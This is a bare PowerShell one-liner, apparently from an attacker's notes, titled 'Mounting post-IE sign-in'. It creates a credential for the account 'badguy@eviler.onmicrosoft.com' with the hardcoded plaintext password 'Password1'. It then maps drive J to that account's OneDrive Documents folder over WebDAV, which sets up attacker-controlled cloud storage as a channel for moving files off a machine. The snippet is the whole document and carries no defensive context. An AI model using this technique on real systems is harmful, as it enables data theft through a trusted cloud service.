#Mounting post-IE sign-in

$password = convertto-securestring -String 'Password1' -AsPlainText -Force ; $Creds = new-object -typename System.Management.Automation.PSCredential('badguy@eviler.onmicrosoft.com', $password) ; New-PSDrive -Name J -PSProvider FileSystem -Root '\\eviler-my.sharepoint.com@SSL\DavWWWRoot\personal\badguy_eviler_onmicrosoft_com\Documents' -Credential $Creds

